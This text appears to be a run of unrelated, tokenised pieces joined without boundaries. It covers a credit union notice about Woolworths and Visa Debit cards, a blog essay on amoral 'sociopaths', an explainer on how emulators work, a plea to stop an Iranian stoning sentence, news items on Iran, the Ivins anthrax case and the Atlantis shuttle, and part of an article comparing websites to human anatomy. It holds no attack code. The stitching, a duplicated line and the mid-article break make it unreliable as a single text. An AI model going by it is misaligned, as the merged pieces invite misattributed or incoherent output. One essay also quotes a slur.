Members – and millions of other Australian consumers – should be aware of a move by Woolworths to restrict the use of Visa Debit cards across their retail empire later this month .
From 15 April , Woolworths ’ outlets ( which include Big W , Woolworths Supermarkets , Safeway , BWS , Dan Murphy ’s , Dick Smith and Tandy ) will start banning customers from selecting the ‘ credit ’ option when using a Visa Debit card to pay for their purchases .
Millions of Australians use Visa Debit cards to help minimise transaction fees and all Savings & Loans members currently receive unlimited free ‘ credit ’ purchases using their Visa Debit card .
By only allowing Visa Debit card users to select ‘ savings ’ or ‘ cheque ’ , Woolworths will be forcing many of its customers to pay extra to buy their groceries .
Without getting too technical , Woolworths will only process Visa Debit purchases through the EFTPOS network , of which it is a part owner .
The move not only limits consumers ’ choice , but also works out better financially for Woolworths .
Woolworths – one of Australia ’s biggest companies – is using its market dominance to tell you how to pay for your shopping .
If you have n’t used one before , a Visa Debit card gives you all the convenience of a traditional credit card , but using your own money .
This means that you can use your card to buy things online , over the phone and to buy your groceries ( at least , anywhere that is n’t owned by Woolworths after 14 April ) .
It ’s a great way of giving people access to their money however they want it , without the risk of going into debt .
The ban only extends to Visa Debit cards , not credit cards .
Woolworths has previously launched its own credit card , which will also not be affected by the ban .
There is n’t much we can do to change Woolworths ’ decision , but there are a few ways to avoid any fees for using the ‘ savings ’ or ‘ cheque ’ option with your Visa Debit card :
• Withdraw money from a rediATM before going shopping – there are over 3,200 rediATMs around Australia
• Think ahead – if you have to use ‘ savings ’ or ‘ cheque ’ , take some cash out so you do n’t have to perform another transaction
• Consider taking out a Visa Credit card – this is n’t the right option for everyone but interest free periods are available and you can ‘ pre- load ’ the card with your own money if you ’re worried about credit cards
We ’re working with our industry group to help ensure that Australia ’s payment system remains fair and our members can continue using their money however they want to .

Again , the response to the Gervais Principle II seems to require a response to key themes that have emerged .
There are several that I am going to touch upon in the next part , and some I am not touching , ever , but one deserves note and a serious response , since I had n’t planned on addressing it .
This is the question of good and evil .
For those of you who want the elevator - pitch version , the short position is this : my entire thesis is amoral ; there are good and evil sociopaths ; more sociopaths is a good thing ; the clueless and losers are exactly as likely to engage in evil behaviors as sociopaths .
Details follow .
Keep in mind that this is a very rough sketch , and a sidebar to the main series that I really do n’t want to pursue too far .
The Word “ Sociopath ”
A large number of commenters have objected to this term , and it has also led to some unnecessary confusion .
Néant Humain , in a precise comment , pointed out that my use of the term does not square with the clinical use ( actually , the term is no longer considered clinically precise at all , and has been replaced by phrases like “ antisocial personality disorder ” ) .
But let ’s step back here .
I am using the word in its everyday , loosely overloaded sense .
As in , you telling your friend , “ you are such a ! @ # # $ sociopath . ”
I want to stick to the term for two good reasons .
One : Hugh Macleod ’s original cartoon which inspired this series is too good to give up .
Second , distrust of communities and groups , and a stubborn individualism , are the main personality characteristics here ( and this position is not original to me ; it is derived from William Whyte ) .
Words like “ player ” or “ enlightened ” ( two suggested alternatives ) do n’t cut it .
I originally characterized “ sociopath ” as will - to - power people .
Let me add a few more characteristics .
First , sociopaths are driven by unsentimental observation of external realities , no matter how unpleasant .
Second , they use the information they acquire through reality - grounding in skilled ways .
Third , their distrust of subsuming communities and groups leads them to adopt personal moralities .
Whether good or evil , the morality of a sociopath is something he or she takes responsibility for .
Finally , and most importantly , sociopaths do not seek legitimacy for their private morality from the group , justify it , or apologize for it .
They may attempt to evade the consequences of their behavior .
In fact their personal morality may legitimize such evasion .
Equally , they may , out of realistic and pragmatic assessments , allow themselves to be subject to codified group morality ( such as a legal or religious system ) , that they privately disagree with .
So they might accept consequences they feel they do not deserve , because they assess attempts at rebellion to be futile .
But in all cases , they reserve for themselves the right to make all moral judgments .
Their private morality is not , in their view , a matter for external democractic judgment .
So yes , this entire edifice I am constructing is a determinedly amoral one .
Hitler would count as a sociopath in this sense , but so would Gandhi and Martin Luther King .
In all this , the source of the personality of this archetype is distrust of the group , so I am sticking to the word “ sociopath ” in this amoral sense .
The fact that many readers have automatically conflated the word “ sociopath ” with “ evil ” in fact reflects the demonizing tendencies of loser / clueless group morality .
The characteristic of these group moralities is automatic distrust of alternative individual moralities .
The distrust directed at the sociopath though , is reactionary rather than informed .
The Morality of the Clueless and Losers
The opposite of the morally - responsible sociopath is what somebody called “ evil clueless ” in a comment , an archetype we have n’t met in the Office universe .
The classic example is the petty , tyrannical bureaucrat of the “ I was only following orders ” variety .
A category that includes the over - zealous Nazi concentration - camp guard .
This example too , came up in the discussion , and in one comment , Harold Smith noted that the Nazi rank - and - file often viewed their actions through a bizarre moral compass :
Your comment about how the loser role fits most people is apt .
I am reading
They thought they were free , about the Nazi era in Germany .
The author , an American Jew , interviewed ten ex-Nazis in depth , all of them self - styled Little Men , who thought the Nazi era was the best part of their lives .
They had no idea what was going on , and did n’t want to know .
The Nazis took care of unemployment , and that was all they were interested in .
Other than characterizing these people as clueless , rather than losers , I completely agree with Harold here .
If the clueless often go “ evil ” in the “ we were only following orders ” mode , losers often go “ evil ” in bystander mode , like the Seinfeld characters in the incident that got them hauled into court under Good Samaritan laws .
As Douglas Hofstadter said , “ apathy at the level of individuals leads to insanity on the level of civilizations . ”
It is loser - apathetic “ somebody else ’s problem ” mode thinking he was talking about .
Since the very idea of “ collective action ” ( ranging from AIDS walks to signature campaigns ) relies entirely on clueless and loser moralities , it is fair to ask : if responsibility - abdicating moral apathy is the characteristic of the loser group ( which is the largest ) , is “ collective action ” a sham ?
The answer is yes , and it has been well known in philosophy for a while as the Free Rider Problem ( originally studied by Olson ) .
In most cases of collective action , a few pay the costs for the many , in bringing about social change .
The ones who pay are usually the benevolent clueless ( Michael - like people with altruistic , but still delusional , grand narratives ) .
The key here is that the clueless and losers often externalize their moral sense , into some sort of collectively ( and ritually ) adopted code , thereby abdicating responsibility for the moral dimension of their actions entirely .
You do n’t have to think about the morality of what you do if you can just appeal to some code ( religious texts are the main kind , but there are others , such as Hippie or Joe the Plumber codes ) .
The morality that they defer to is always a codified communal version of the views of some charismatic sociopath , but it is the abdication of responsibility , as a group , by the clueless and losers , that amplifies the impact of both the Hitlers and Gandhis of the world .
Without this group dynamic , Hitler would have been a random local psycho , perhaps serial - killing a dozen people .
Gandhi might have been no more than a friendly neighborhood do - gooder .
Which implies , by the way , that organized religion is incompatible with sociopathy .
This entire view can be disturbing to some of you , so take a step back here .
What do you fear most ?
An evil group or an evil person ?
Read Shirley Jackson ’s thoroughly scary story of group insanity , The Lottery .
Watch Children of the Corn .
Would you rather live in a town where there is a sole vampire terrorizing the population , or be the sole non-zombie in a town that has gone all - zombie ?
Ask yourself , who scares you more —
Hitler or the mindless army he inspired ?
Would you prefer the tyranny of a dictator or the tyranny of an illiberal democracy , where a mob tramples over individuals ?
Dictators can be overthrown .
Can an evil group culture be as easily displaced ?
I do n’t want to offer flippant and easy solutions to these age - old moral conundrums .
I just want to point out to those who are equating “ sociopath ” with “ evil ” ( modulo any semantic confusion ) that morality needs to be looked at in more complex ways .
Compassion , Sociopathy and Reluctant Messiahs
Let ’s talk a little about the Good Sociopath .
When people engage in actions that are broadly recognized as “ good , ” the defining quality of their behavior is usually the value of compassion .
Yet , compassion plays out very differently among the three groups .
Sociopaths can be compassionate because their distrust only extends to groups .
They are capable of understanding and empathizing with individual pain and acting with compassion .
A sociopath who sets out to be compassionate is strongly limited by two factors : the distrust of groups ( and therefore skepticism and distrust of large - scale , organized compassion ) , and the firm grounding in reality .
The second factor allows sociopaths to look unsentimentally at all aspects of reality , including the fact that apparently compassionate actions that make you “ feel good ” and assuage guilt today may have unintended consequences that actually create more evil in the long term .
This is what makes even good sociopaths often seem callous to even those among the clueless and losers who trust the sociopath ’s intentions .
The apparent callousness is actually evidence that hard moral choices are being made .
When driven by compassion , therefore , sociopaths prefer small individual kindnesses to joining large - scale world - hunger solving efforts .
The good sociopath is more likely to ask : how can I make a modest and cautious effort to improve the life of this person I am with right now , as opposed to participating in something lofty and dangerously abstract , like a signature campaign .
When a sociopath has the resources for ( and feels the imperative towards ) larger scale do - gooding , you get something like Bill Gates ’ behavior : a very careful , cautious , eyes - wide - open approach to compassion .
Gates has taken on a world - hunger sized problem , but there is very little ceremony or posturing about it .
It is sociopath compassion .
Underlying the scale is a residual distrust of the group — especially the group inspired by oneself — that leads to the “ reluctant messiah ” effect .
Nothing is as scary to the compassionate and powerful sociopath as the unthinking adulation and following inspired by their ideas .
I suspect the best among these lie awake at night worrying that if they were to die , the headless group might mutate into a monster driven by a frozen , unexamined moral code .
Which is why the smartest attempt to engineer institutionalized doubt , self - examination and formal checks and balances into any systems they design .
The clueless are not capable of much compassion , unless they can very strongly identify with the person .
The one time Michael displays this sort of compassion is when he attends Pam ’s painting exhibition .
In his other “ charitable ” efforts , Michael is clearly posturing .
Losers , by and large , engage in apparently compassionate actions to feel good about themselves , assuage guilt , and other sorts of purely pathos - driven motivations .
Mostly , they are apathetic due to a rational realization that there is n’t actually a whole lot they can do .
Ethos and logos can only enter into compassionate action when there is , to begin with , an acceptance of individual responsibility .
So loser - morality is ultimately either derivative or flawed , and therefore uninteresting .
This is not to say that all loser / clueless attempts at compassionate action must fail , backfire or otherwise mess up .
The group morality in favor of which they abdicate responsibility may be a good one .
And since all moral codes must be invented by someone , and only sociopaths accept the individual moral responsibility necessary for invention , it follows that the clueless and losers must be good or evil in roughly the same proportion that the sociopaths are good or evil .
Why Am I Doing This ?
I am staggered by the number of people who seem to react ( either with glee or horror ) as though I were revealing some deep secrets of an inner-circle cult that runs the world .
There are those who react like I am revealing some secret pragmatist manual , whistle - blower style .
One commenter , RC even suggested that I ought to look at the morality of writing this series the way hackers look at the morality of revealing exploits : good because it might clue - up losers , bad because it might encourage more people to become sociopaths .
Come again ?
This particular class of criticism breaks down into two kinds .
First , some of you disagree with me at a moral / philosophical level about the nature of sociopathy , and that ’s the “ do we need more [ assumed evil ] sociopaths ? ” critique .
I hope my explanation of the amorality of the sociopath stance makes a response mostly unnecessary : I disagree with the premise that “ more sociopaths is bad . ”
More people taking individual moral responsibility is a good thing .
It is in a sense a different reading of Old Testament morality — eating the fruit of the tree of knowledge and learning to tell good and evil apart is a good thing .
An atheist view of the Bible must necessarily be allegorical , and at the risk of offending some of you , here ’s my take on the Biblical tale of the Garden of Eden : Adam and Eve were clueless , having abdicated moral responsibility to a ( putatively good ) sociopath : God .
Then they became sociopaths in their own right .
And were forced to live in an ecosystem that included another sociopath — the archetypal evil one , Satan — that the good one could no longer shield them from .
This makes the “ descent ” from the Garden of Eden an awakening into freedom rather than a descent into baseness .
A good thing .
But I realize a lot of you will disagree ( with various degrees of violence ) with my personal moral code as I have articulated it here .
In that case , if you liked the two Gervais Principle articles , you must ask yourself — did you badly misunderstand what I was saying , or did you understand , but have n’t faced up to the disconnect between what your gut resonated with , and the actual logical structure of these arguments ?
The second kind of criticism here is based either on acceptance of my moral framework or obliviousness to the moral dimension .
This is the source of the “ why are you sharing tactical / playbook secrets from the inner circle ? ” question .
For this kind of criticism , I frankly have low patience .
If you do n’t get that reading a playbook and being a good player are entirely different things , then to quote that fascinating sociopath , Eric Cartman , “ somebody please put that retard out of his misery . ”
You are putting the cart before the horse .
Kasporov was , in a sense , a great chess player before he read up the rulebook and learned the major openings .
If he had n’t learned Chess , he ’d have learned some otherrelated game , say Go , and become good at that .
Finally , some have asked me what I consider myself .
I am surprised that is not clear .
Morally , I am a sociopath and have been for maybe 10 years .
Before that , I oscillated between cluelessness and loserdom .
Whether I am an effective sociopath , and actually good at playing the game ( as opposed to describing it with an anthropological eye ) remains to be seen .
I am not dead yet , and so far , the other sociopaths in my world have n’t yet bankrupted me of table stakes .
That moral stance , by the way , should make it clear that I did n’t particularly enjoy writing this post , since morality is a personal thing for me .
But I figured I ought to put this out there .
And remember , I am not looking to legitimize , justify or apologize for these views .
Do with them what you will .
If this makes you want to stop reading the series , so be it .
That ’s all for now .
Gratified though I am by the popularity of this series , I do n’t want it taking over my blog , so I probably wo n’t get to Part III of the main series till January .
I promise at least one other meaty piece on some other topic before the holidays though .
Emulation is a multi- faceted area .
Here are the basic ideas and functional components .
I 'm going to break it into pieces and then fill in the details via edits .
Many of the things I 'm going to describe will require knowledge of the inner workings of processors -- assembly knowledge is necessary .
If I 'm a bit too vague on certain things , please ask questions so I can continue to improve this answer .
Basic idea :
Emulation works by handling the behavior of the processor and the individual components .
You build each individual piece of the system and then connect the pieces much like wires do in hardware .
Processor emulation :
There are three ways of handling processor emulation :
Interpretation
Dynamic recompilation
Static recompilation
With all of these paths , you have the same overall goal : execute a piece of code to modify processor state and interact with ' hardware ' .
Processor state is a conglomeration of the processor registers , interrupt handlers , etc for a given processor target .
For the 6502 , you 'd have a number of 8 - bit integers representing registers : A , X , Y , P , and S ; you 'd also have a 16 - bit PC register .
With interpretation , you start at the IP ( instruction pointer -- also called PC , program counter ) and read the instruction from memory .
Your code parses this instruction and uses this information to alter processor state as specified by your processor .
The core problem with interpretation is that it 's very slow ; each time you handle a given instruction , you have to decode it and perform the requisite operation .
With dynamic recompilation , you iterate over the code much like interpretation , but instead of just executing opcodes , you build up a list of operations .
Once you reach a branch instruction , you compile this list of operations to machine code for your host platform , then you cache this compiled code and execute it .
Then when you hit a given instruction group again , you only have to execute the code from the cache .
( BTW , most people do n't actually make a list of instructions but compile them to machine code on the fly -- this makes it more difficult to optimize , but that 's out of the scope of this answer , unless enough people are interested )
With static recompilation , you do the same as in dynamic recompilation , but you follow branches .
You end up building a chunk of code that represents all of the code in the program , which can then be executed with no further interference .
This would be a great mechanism if it were n't for the following problems :
Code that is n't in the program to begin with ( e.g. compressed , encrypted , generated / modified at runtime , etc ) wo n't be recompiled , so it wo n't run
It 's been proven that finding all the code in a given binary is equivalent to the Halting problem
These combine to make static recompilation completely infeasible in 99 % of cases .
For more information , Michael Steil has done some great research into static recompilation -- the best I 've seen .
The other side to processor emulation is the way in which you interact with hardware .
This really has two sides :
Processor timing
Interrupt handling
Processor timing :
Certain platforms -- especially older consoles like the NES , SNES , etc -- require your emulator to have strict timing to be completely compatible .
With the NES , you have the PPU ( pixel processing unit ) which requires that the CPU put pixels into its memory at precise moments .
If you use interpretation , you can easily count cycles and emulate proper timing ; with dynamic / static recompilation , things are a / lot/ more complex .
Interrupt handling :
Interrupts are the primary mechanism that the CPU communicates with hardware .
Generally , your hardware components will tell the CPU what interrupts it cares about .
This is pretty straightforward -- when your code throws a given interrupt , you look at the interrupt handler table and call the proper callback .
Hardware emulation :
There are two sides to emulating a given hardware device :
Emulating the functionality of the device
Emulating the actual device interfaces
Take the case of a hard - drive .
The functionality is emulated by creating the backing storage , read / write / format routines , etc .
This part is generally very straightforward .
The actual interface of the device is a bit more complex .
This is generally some combination of memory mapped registers ( e.g. parts of memory that the device watches for changes to do signaling ) and interrupts .
For a hard - drive , you may have a memory mapped area where you place read commands , writes , etc , then read this data back .
I 'd go into more detail , but there are a million ways you can go with it .
If you have any specific questions here , feel free to ask and I 'll add the info .
Resources :
I think I 've given a pretty good intro here , but there are a ton of additional areas .
I 'm more than happy to help with any questions ; I 've been very vague in most of this simply due to the immense complexity .
Obligatory Wikipedia links :
General emulation resources :
Zophar --
This is where I got my start with emulation , first downloading emulators and eventually plundering their immense archives of documentation .
This is the absolute best resource you can possibly have .
NGEmu --
Not many direct resources , but their forums are unbeatable .
RomHacking.net --
The documents section contains resources regarding machine architecture for popular consoles
Emulator projects to reference :
IronBabel --
This is an emulation platform for .NET , written in Nemerle and recompiles code to C# on the fly .
Disclaimer :
This is my project , so pardon the shameless plug .
BSnes --
An awesome SNES emulator with the goal of cycle - perfect accuracy .
MAME --
The arcade emulator .
Great reference .
arcade emulator .
Great reference .
6502asm.com --
This is a JavaScript 6502 emulator with a cool little forum .
dynarec'd 6502asm --
This is a little hack I did over a day or two .
I took the existing emulator from 6502asm.com and changed it to dynamically recompile the code to JavaScript for massive speed increases .
Processor recompilation references :
The research into static recompilation done by Michael Steil ( referenced above ) culminated in this paper and you can find source and such here .
Addendum :
It 's been well over a year since this answer was submitted and with all the attention it 's been getting , I figured it 's time to update some things .
Perhaps the most exciting thing in emulation right now is libcpu , started by the aforementioned Michael Steil .
It 's a library intended to support a large number of CPU cores , which use LLVM for recompilation ( static and dynamic ! ) .
It 's got huge potential , and I think it 'll do great things for emulation .
emu - docs has also been brought to my attention , which houses a great repository of system documentation , which is very useful for emulation purposes .
I have n't spent much time there , but it looks like they have a lot of great resources .
I 'm glad this post has been helpful , and I 'm hoping I can get off my arse and finish up my book on the subject by the end of the year / early next year .

LETTER FROM THE CHILDREN OF SAKINE MOHAMMADI :
Do not allow our nightmare become a reality ,
Protest against our mother ’s stoning !
Today we stretch out our hands to the people of the whole world .
It is now five years that we have lived in fear and in horror , deprived of motherly love .
Is the world so cruel that it can watch this catastrophe and do nothing about it ?
We are Sakine Mohammadi e Ashtiani ’s children , Farideh and Sajjad Mohamamadi e Ashtiani .
Since our childhood we have been acquainted with the pain of knowing that our mother is imprisoned and awaiting a catastrophe .
To tell the truth , the term “ stoning ” is so horrific that we try never to use it .
We instead say our mother is in danger , she might be killed , and she deserves everyone ’s help .
Today , when nearly all options have reached dead - ends , and our mother ’s lawyer says that she is in a dangerous situation , we resort to you .
We resort to the people of the world , no matter who you are and where in the world you live .
We resort to you , people of Iran , all of you who have experienced the pain and anguish of the horror of losing a loved one .
Please help our mother return home !
We especially stretch our hand out to the Iranians living abroad .
Help to prevent this nightmare from becoming reality .
Save our mother .
We are unable to explain the anguish of every moment , every second of our lives .
Words are unable to articulate our fear …
Help to save our mother .
Write to and ask officials to free her .
Tell them that she does n’t have a civil complainant and has not done any wrong .
Our mother should not be killed .
Is there any one hearing this and rushing to our assistance ?
Farideh and Sajjad Mohammadi e Ashtiani

Iran questions Russia 's friendship

KERMAN , Iran —
Iran 's president on Wednesday urged US President Barack Obama to accept the Brazilian - brokered nuclear fuel exchange deal , warning that Obama will miss a historic opportunity for improved cooperation from Teheran if the offer is rejected .
Washington has denounced the Iranian offer as a ploy by Teheran to avoid a new round of UN sanctions over its controversial nuclear program , which the West fears is geared toward nuclear weapons .
But the proposal did not deter US , Russia , China , Britain and France — the five permanent Security Council members — from agreeing on a draft fourth set of sanctions against Iran for refusing to completely halt uranium enrichment , as demanded by the United Nations .
US Secretary of State Hillary Rodham Clinton on Tuesday said in the Chinese capital , Beijing , that Teheran 's offer , submitted on Monday to the UN 's nuclear watchdog , was inadequate and did not address international concerns about Iran 's nuclear ambitions .
Teheran 's offer is similar to a UN - drafted plan that Washington and its allies last year pressed Iran to accept , but which the Mideast nation rejected at the time . " Mr. Obama must know that this proposal is a historic opportunity ... [ Obama should ] know that if this opportunity is lost , I doubt the Iranian nation will give a new chance to this gentleman in the future , " Ahmadinejad said during a rally in the southern town of Kerman .
Mahmoud Ahmadinejad also issued a stern warning to Russia , saying Moscow 's support for the US - led push for a new round of UN sanctions against Iran was contrary to the two countries ' neighborly and friendly relations .
Ahmadinejad also singled out Russian President Dmitry Medvedev , saying the neighboring country 's leader had caved in to US pressure for new sanctions on Teheran " Justifying the behavior of Mr. Medvedev today has become very difficult , " he said .
" The Iranian nation does n't know whether [ Russians ] ultimately are friends , whether they stand by us or are after other things . "

A microbiologist who supervised the work of accused anthrax killer Bruce E. Ivins explained to a National Academy of Sciences panel Thursday why the arithmetic of growing anthrax did n't add up to Ivins ' mailing deadly spores in fall 2001 .
" Impossible , " said Dr. Henry S. Heine of a scenario in which Ivins , another civilian microbiologist working for the Army , allegedly prepared the anthrax spores at an Army lab at Fort Detrick .
Heine told the 16 - member panel that Ivins would have had to grow as many as 10 trillion spores , an astronomical amount that could n't have gone unnoticed by his colleagues .
According to FBI calculations , Ivins accomplished this working after - hours in a special suite for handling lethal agents designated B3 , for Biohazard Level 3 .
A bar chart released by the bureau ( PDF ) when it closed its nearly 9 - year - old Amerithrax case in February showed that in August and September 2001 , the months immediately before the first anthrax letters were mailed , Ivins logged 34 more hours in the B3 suite than his combined total for the previous seven months .
" That 's more than 8,000 hours ( close to a year ) short of what he would have needed to grow the anthrax , " Heine told ProPublica in an interview after his NAS presentation .
Heine , one of the few scientists at the Army lab with the skills to grow large batches of anthrax , told ProPublica it would have taken around " 100 liters of liquid anthrax culture , " or more than 26 gallons , to grow all the dried spores that killed five Americans and infected 17 others .

" He could n't have done that without us knowing it , " said Heine .
Other biodefense scientists who did n't work with Ivins have done the same calculations and reached the same conclusion as Heine .
The FBI declined to comment on this latest challenge to its decision to end one of the most expensive manhunts in the bureau 's 102 - year history .
In closing the case , the agency said Ivins alone was responsible for the anthrax letters .
Ivins committed suicide in 2008 .
Many of Ivins ' colleagues and some federal lawmakers protested that the FBI was premature in closing the books on Ivins before the academy had completed its review of the science undergirding the bureau 's case .
" To this day , it is still far from clear that Mr. Ivins had either the know - how or access to the equipment needed to produce the material , " said Rep. Jerrold Nadler , D - N.Y. , in written remarks published in March .
The day Heine and his Fort Detrick colleagues learned of Ivins ' suicide in July 2008 , Heine said they conferred and feared the F.B.I. would then blame the attacks on someone who could no longer speak in his own defense .
" And the very next day , the bureau named Bruce the mailer , " Heine recalled .
Because of an FBI gag order , Heine said he was unable to discuss these details until he left his job at the United States Army Medical Research Institute of Infectious Diseases , at Fort Detrick , where Ivins also worked developing anthrax vaccines .
Heine left in February and is now senior scientist at the Ordway Research Institute , Inc. Center for Biodefense and Emerging Infections in Albany , N.Y .
Heine said his expertise in growing anthrax made him a suspect like Ivins .
He said FBI agents gave him a polygraph exam and took statements from him several times between 2001 and 2003 .
The FBI was never far away , he said .
A former scoutmaster , Heine said that on campouts his Boy Scout troop used to keep a " black Suburban watch , " looking for the vehicles driven by the agents keeping Heine under surveillance .
" The FBI went after our weakest link , " Heine said , referring to Ivins and other scientists at Fort Detrick , in Maryland .
He called Ivins " fragile " and especially vulnerable to bureau attempts to extract a confession from him .
" If Bruce did it , we would 've turned him in for a million dollars in a heartbeat , " said Heine , referring to the government reward for information leading to the capture of the anthrax mailer .
" Seriously , though , reward or no reward , we would 've stopped him because that would 've been the right thing to do . "
The FBI linked Ivins to the crime , in part , because of a genetic match between the anthrax spores kept by Ivins and those in the letters .
Documents released by the bureau said that samples of the same anthrax strain were shipped by Ivins to at least four different U.S. laboratories before the attacks .
That does n't exonerate Ivins , Heine conceded , but he said Ivins ' guilt is also far from certain .
The spores in the anthrax letters were in a dry powder form that spread easily .
" When you dry spores , they fly everywhere and you can't see 'em , " said Heine .
" Had Bruce made it during all those late nights in the hot suite , we would 've been his first victims . "

The Atlantis shuttle has landed at the Kennedy Space Center after what looks to have been its final mission .
The vehicle touched down on runway 33 at the Florida spaceport at 0848 local time ( 1248 GMT ) .
Atlantis , with its six - person crew , has just delivered a Russian mini-module and spare equipment to the International Space Station ( ISS ) .
The orbiters are due to be retired this year , and just two more outings are planned - for Discovery and Endeavour .
" That looked pretty sweet , " Mission Control radioed Atlantis commander Ken " Hock " Ham after the wheels of the orbiter had come to a stop .
" That was a suiting end to an incredible mission .
I 'm sure the station crew - members hated to see you leave , but we 're glad to have you back .
You guys executed [ the mission ] flawlessly and not only that , you had a great time doing it . "
Once the crew had disembarked , Commander Ham said : " Atlantis is an incredible ship .
She was absolutely perfect through this entire mission . "
The ship will not go straight to a museum .
It will instead go back to the Orbiter Processing Facility at Kennedy .
ATLANTIS BY NUMBERS
First flight : 3 October 1985
Total number of flights : 32
Distance travelled : 195 million km
Total number of days in orbit : 294
Total number of orbits : 4,648
There , it will be prepared as a standby shuttle ready to go and rescue the astronauts on the remaining flights should they get into trouble .
And the US space agency ( Nasa ) has also not excluded the possibility that it could yet fly out this standby Atlantis to take additional spares and supplies to the space station .
In addition , some members of the US Congress are still trying to get the shuttle programme extended .
They oppose President Barack Obama 's new exploration policy .
He wants the shuttles retired and the business of taxiing astronauts to and from the ISS passed to private companies .
He believes the US space agency should concentrate its efforts on developing vehicles that can reach more distant targets , such as asteroids and Mars .
The shuttles , which have been working in space since 1981 , cannot fulfil that role because their systems restrict them to near - Earth operations .
Atlantis 's crew launched on 14 May fully expecting their mission to be the last for the ship .
Their mission badge could be interpreted as the shuttle flying into the sunset .
First flown on 3 October 1985 , Atlantis has now completed 32 missions and travelled about 195 million km ( 120 million miles ) .

Many people find it hard to picture a website as more than a bundle of content .
This often makes explaining the mixture of languages used and the way everything comes together a difficult task .
Because what makes up a website can be related and linked to the physiology of a human body , this article ’s comparison should help clients and beginners alike understand the complex nature of a site ’s creation and components .
Disclaimer :
It ’s probably worth pointing out before we start the “ autopsy ” that I ’m not a doctor .
Therefore , I recommend you do n’t practice this literally on your friends and family — they wo n’t appreciate you peeking inside their ears to look for meta information !
Designer DNA : Schemas and DTDs
Humans have predefined characteristics for how we look .
These building blocks of life are passed down to us through genetics , and when arranged properly , give us our unique appearance .
This process of evolution takes millions of years to adapt to changing environments and certainly plays a part in limiting both our structural and visual appearance .
In terms of the Web , the regulators of code “ genetics ” are commonly known as Schemas ( you ’ll be aware of these devices from DTDs ) .
The human body contains DNA , just like a website .
It explains how your body should react .
Of course , while the process of creating a schema does n’t take millions of years , it does take a certain length of time for new languages to appear and become widely adopted , thereby evolving the building blocks of your website .
As a result , while sites may look different , you can be assured that they only use one of a family of structural languages that predefine many of its characteristics , and what you end up with will share common elements and tags with many millions of others .
Bonus :
The very inclusion of a DTD in your document can set standards for your code and avoid the obscurities that quirks mode can present to your web browser .
Therefore , having this DNA , which describes the language used , can prove beneficial in inheriting Web standards .
A language specification and DTD provide the genetic material all websites use and inherit .
Skeletal Structure : The Structural Markup
The structure of the human body is made up of bones that define our basic shape — the same is true of web documents in the sense that they are shaped from various interlinking elements that form the backbone of the Web .
Most web documents are formed through languages which describe the skeletal structure of the document , such as HTML and XML .
RSS is also a classic example of a markup that structures a website ’s content .
Without these core markup languages , your website would not be able to maintain its layout .
All the parts of a website join up , like the bones that interconnect within your body .
While each bone in the human body serves a specific purpose , entire groups of bones can serve a single job , such as the ribs ( each protects your lungs ) or your finger bones which help you grasp objects .
Because this repeating purpose can exist within a website ’s body , they can be distinguished by attaching conventions like microformats that can give additional semantic characteristics and value beyond what a “ generic ” or reused element would offer , acting as a point of bodily recognition .
Bonus : Microformats are descriptive elements ( usually as class or ID values ) which give your structure some recognisable semantic values — this is much like recognising each finger bone by its appearance and unique characteristic .
It ’s labeling your anatomy for referral !
Bones are like web page elements :
They build up a logical structure that gives the body its core appearance .
Mechanical Muscles : Client - side Scripting
Being able to move allows you to interact and engage with people you meet .
Without muscles , we ca n’t turn thoughts into a reaction .
As people expect a certain level of involvement with your site , not enough interactivity could make your site appear unemotional .
Muscles work between the skin and bones to allow both to fluidly play their part in the interaction .
The same is true about sites where behaviour underpins the style and structure of a site to “ flex ” only when interaction is required .
When you flex your muscles , movement occurs .
When a website flexes , a reaction also occurs .
Client - side scripting is the muscular component of a site .
Languages like JavaScript allow interaction when visitors click , move their mouse , press a key on their keyboard or make any other noticeable gesture .
This response mechanism functions just like the body in that it reacts based on its surroundings .
Simply put , the “ muscles ” act as a way to interact and make noticeable changes in structure ( standing up rather than sitting down ) or appearance ( smiling instead of frowning ) .
Bonus : Just as humans have multiple methods of input ( such as sensory mechanisms like touch , taste , sight , smell and hearing ) , JavaScript and other client - side scripting languages can interact and react based on its own input methods like touch , speech , automated actions and movement .
Movement and reaction are key components to both human survival and website interaction .
Nervous Reactions : The Web Browser
With scripting included in your website comes the need to send and receive information that acts upon the interaction occurring within your design .
In a website , the mechanism of communicating these signals belongs to the user - agent or server that handles the requests and reflects those requests to act into a mechanism that is visible to the end user .
In short : Your web browser works the mojo !
In the human body , such requests are sent as electrical signals that pass through the various organs and are broadcasted to conduct the action determined from the receptor , such as when you feel pain .
In a website , while pain does n’t exist ( except for the end user who encounters an unusable interface element like a nasty webform ) the code fires signals to the browser upon examination and triggers structure , style and behavioural reactions in turn .
Bonus :
The rendering engine of a browser does everything from ensuring the sites “ body ” appears correctly , right down to reacting upon interaction .
Even the likes of Flash , which attach themselves to a browser , have their own method of “ nerve ” - based interaction !
Flash websites are a great example of how information is rendered to progress effects .
The Heart : Content and the Community
The heart of a website is its content — if you ’ve read any “ Content is King ” articles , you ’ll know what I mean .
With the human heart , a constant supply of oxygen needs to be pumped around the body to the vital organs — otherwise you ’ll suffer long - term damage .
The same is true for the Web , when a lack of quality regularly updated content exists , the site will become inefficient in producing visitors ( the life blood of a site ) and will starve ( as it ’s abandoned ) , thereby giving the site ’s body a fatal blow .
If the heart is healthy , the pathways will be clear .
If too much damage occurs , it may break .
The website ’s content is encased within the structure , securing it where it needs to appear .
The more pages you add , the stronger the structure — both internal and external — of the website will become .
Therefore , as a result , it will become more resilient for when illness appears .
The outdated but still constantly visited W3Schools is proof of this .
The balance of getting visitors ( blood ) around the body of the site will depend on how much depth and energy is put into a content - rich website .
Bonus :
While not enough visitors can cause the heart to be starved of oxygen , too many visitors can have a similar effect .
Just like when your heart works too hard , a sudden spike in traffic could make the server where your website is located collapse under the pressure , just like a heart attack !
Poor quality content of little visitor value will simply result in your community dying .
Blood Vessels : Information Architecture
As mentioned above , the ability to get people ( the blood ) to the places they need to get ( feeding the site ’s popularity and architecture ) is one of the key elements of building a website .
The way a site takes to interlink all the bodily elements which comprise a website is commonly referred to the information architecture .
This — in simple terms — is the way we organize , structure and relate pages of a web design together ( and how each page is structured in itself ) .
This well - organized method of interlinking the needs of various components of a website can be easily be recognised in the human body in terms of the blood vessels .
As described before , if visitors are the life blood of a website , the blood vessels would be the way we address the interlinking of pages , the findability of information and how files connect to feed each other ( relative to the overall site structure ) .
Just as blood flows in the body , humans should flow between pages and sections .
Bonus : Usability and accessibility have their place in this analysis .
When dead links or poor navigation occurs , the damage caused can haemorrhage visitors ( as they leave your site ) .
The case of where a button cost millions of dollars shows this relative link in full effect !
If pages do n’t link together appropriately , it can result in a loss of your sites visitors .
Sexy Skin : Aesthetics and Web Design
What makes people look human ?
